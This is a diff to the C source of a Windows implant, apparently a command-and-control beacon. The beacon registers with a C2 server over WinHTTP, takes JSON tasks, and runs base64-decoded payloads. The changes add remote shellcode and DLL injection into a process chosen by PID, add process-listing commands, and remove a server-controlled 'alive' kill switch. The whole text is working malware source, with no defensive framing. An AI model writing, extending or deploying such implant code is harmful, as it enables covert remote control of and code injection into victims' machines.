@@ -126,26 +126,6 @@ BOOL GetBasicCompInfo(struct BasicCompInfo *CompInfo)
 
 }
 
-LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
-{
-
-    // get the 'alive' parameter of the json data and if its false... die
-
-    struct json_object *parsed_json;
-
-    parsed_json = json_tokener_parse(ReadBuffer);
-    parsed_json = json_object_object_get(parsed_json, "alive");
-
-    if (parsed_json != NULL)
-    {
-        if (!json_object_get_boolean(parsed_json))
-        {
-            DieCleanly();
-        }
-    }
-
-}
-
 LPVOID DieCleanly()
 {
     // not much to say bout this lol
@@ -179,6 +159,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     if (!hSession)
     {
         // not really alot we can do about this, guess we just return and try again later...
+        DEBUG("FAILED: WinHttpOpen, GetLastError(): %d", GetLastError());
         return FALSE;
     }
 
@@ -191,6 +172,8 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     if (!hConnect)
     {
         rWinHttpCloseHandle(hSession);
+
+        DEBUG("FAILED: WinHttpConnect, GetLastError(): %d", GetLastError());
 
         return FALSE;
     }
@@ -206,6 +189,8 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         rWinHttpCloseHandle(hSession);
         rWinHttpCloseHandle(hConnect);
 
+        DEBUG("FAILED: WinHttpOpenRequest, GetLastError(): %d", GetLastError());
+
         return FALSE;
     }
 
@@ -220,6 +205,8 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         rWinHttpCloseHandle(hRequest);
         rWinHttpCloseHandle(hSession);
         rWinHttpCloseHandle(hConnect);
+
+        DEBUG("FAILED: WinHttpSetOption, GetLastError(): %d", GetLastError());
 
         return FALSE;
     }
@@ -239,10 +226,10 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     } else {
         if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
         {
-            DEBUG("Failed to make callback");
+            DEBUG("FAILED: WinHttpSendRequest (ERROR_WINHTTP_SECURE_FAILURE)");
         }
 
-        DEBUG("WinHttpSendRequest error: %d\n", GetLastError());
+        DEBUG("FAILED: WinHttpSendRequest, GetLastError(): %d", GetLastError());
     }
 
     // no lets get the session id
@@ -255,7 +242,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
             if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 // Theres no data avalible
-                DEBUG("WinHttpQueryDataAvailable error\n");
+                DEBUG("FAILED: WinHttpQueryDataAvailable, GetLastError(): %d", GetLastError());
                 return FALSE;
             }
 
@@ -265,7 +252,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
             if (!rWinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
             {
                 // been an error
-                DEBUG("WinHttpReadData error\n");
+                DEBUG("FAILED: WinHttpReadData, GetLastError(): %d", GetLastError());
                 return FALSE;
             }
 
@@ -284,9 +271,6 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     // get the id and store it in the idbuffer
     parsed_json = json_object_object_get(parsed_json, "id");
     strcpy(IdBuffer, json_object_get_string(parsed_json));
-
-    // now check we dont need to kill ourselves
-    CheckIfDie(&ReadBuffer);
 
     return TRUE;
 }
@@ -502,9 +486,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
         } while (dwSize > 0);
     }
 
-    // check if we need to die
-    CheckIfDie(ResBuffer);
-
     // get the opcode
     parsed_json = json_tokener_parse(ResBuffer);
     parsed_json = json_object_object_get(parsed_json, "task");
@@ -520,7 +501,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     return NULL;
 }
 
-BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
+BOOL SpawnExecuteCode(char* Base64Buffer)
 {
     size_t out_len   = strlen(Base64Buffer) + 1;
     size_t b64_len   = b64_decoded_size(Base64Buffer);
@@ -528,21 +509,57 @@ BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
 
     b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);
 
-    DEBUG("Calling ExecuteMemory");
+    return SpawnCode(b64_out, b64_len);
+}
 
-    switch (CodeType)
-    {
-    case TRUE:
-        // execute module
-        return ExecuteMemory(b64_out, b64_len, TRUE);
+BOOL InjectExecuteCode(char* Buffer)
+{
+    struct json_object *parsed_json;
 
-    case FALSE:
-        // execute arbitary user code
-        return ExecuteMemory(b64_out, b64_len, FALSE);
+    // get pid to inject into
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "pid");
+    int pid = json_object_get_int(parsed_json);
 
-    default:
-        return FALSE;
-    }
+    // get the base64 data to inject
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "data");
+    char* data = json_object_get_string(parsed_json);
+
+    // decode that base64 data
+    size_t out_len   = strlen(data) + 1;
+    size_t b64_len   = b64_decoded_size(data);
+    char*  b64_out   = (char*)malloc(out_len);
+
+    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);
+
+    // inject the code
+    return InjectCode(b64_out, b64_len, pid);
+}
+
+BOOL InjectExecuteDll(char* Buffer)
+{
+    struct json_object *parsed_json;
+
+    // get pid to inject into
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "pid");
+    int pid = json_object_get_int(parsed_json);
+
+    // get the base64 dll to inject
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "dll");
+    char* data = json_object_get_string(parsed_json);
+
+    // decode that base64 dll
+    size_t out_len   = strlen(data) + 1;
+    size_t b64_len   = b64_decoded_size(data);
+    char*  b64_out   = (char*)malloc(out_len);
+
+    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);
+
+    // inject the code
+    return InjectDLL(b64_out, b64_len, pid);
 }
 
 BOOL Stdlib(char* Buffer)
@@ -586,18 +603,12 @@ BOOL Stdlib(char* Buffer)
         data = changedir(args);
         break;
 
-    // I have no idea why this doesnt work.
-    // case 0x7000:
-    //     // rewrite
-    //     if (strlen(args) == 0)
-    //     {
-    //         data = whoami(FALSE);
-    //     } else {
-    //         data = whoami(TRUE);
-    //     }
-    //     break;
+    case 0x7000:
+        data = getpid();
+        break;
 
     case 0x8000:
+        data = getps();
         break;
     }
 
